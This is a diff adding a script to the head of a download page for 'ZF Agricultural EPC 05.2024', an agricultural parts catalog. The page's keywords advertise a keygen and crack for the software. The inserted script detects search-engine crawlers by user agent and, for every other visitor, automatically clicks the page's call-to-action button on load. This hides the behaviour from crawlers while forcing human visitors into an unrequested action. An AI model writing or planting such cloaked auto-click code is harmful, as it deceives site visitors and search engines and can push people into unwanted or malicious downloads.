@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ZF Agricultural EPC 05.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download ZF Agricultural EPC 05.2024 for spare parts catalog, assembly diagrams, and maintenance in English and Spanish.">
     <meta name="keywords" content="ZF Agricultural EPC 05.2024, ZF Agricultural parts catalog, electronic parts catalog ZF, ZF machinery parts identification, ZF Agricultural assembly diagrams, ZF equipment repair parts, ZF EPC catalog 2024, ZF parts and components, ZF Agricultural maintenance guide, ZF machinery part numbers, ZF EPC for agriculture, ZF repair and maintenance catalog, ZF Agricultural parts ordering, ZF parts electronic catalog, ZF Agricultural EPC free download, ZF Agricultural EPC 2024 download, ZF Agricultural EPC download, ZF Agricultural EPC download free, ZF Agricultural EPC download high speed, ZF Agricultural EPC keygen, ZF Agricultural EPC crack, ZF Agricultural EPC spare parts catalog, ZF parts catalog English, ZF parts catalog Spanish, ZF machinery parts catalog, ZF Agricultural EPC VISTA compatible, ZF Agricultural EPC Windows 7 compatible, ZF Agricultural EPC Windows 10 compatible, ZF Agricultural EPC South America, AGCO-MF parts catalog, AGCO-VT parts catalog, AGRALE parts catalog, AGRINAR parts catalog, CATERPILLAR parts catalog, CBT parts catalog, CNH parts catalog, COYOTE parts catalog, FORD parts catalog, JOHN DEERE parts catalog, LADINI parts catalog, LS MTRON parts catalog, MAHINDRA parts catalog, MONTANA parts catalog, NEW HOLLAND parts catalog, PAUNY parts catalog, SHANDONG WUZENG GROUP CO.LTDA parts catalog, STARA parts catalog, TRAMONTINI parts catalog, URSUS - MAQUINAS AGRICOLAS parts catalog, YANMAR parts catalog, ZF - ESPANHA parts catalog">
     <style>
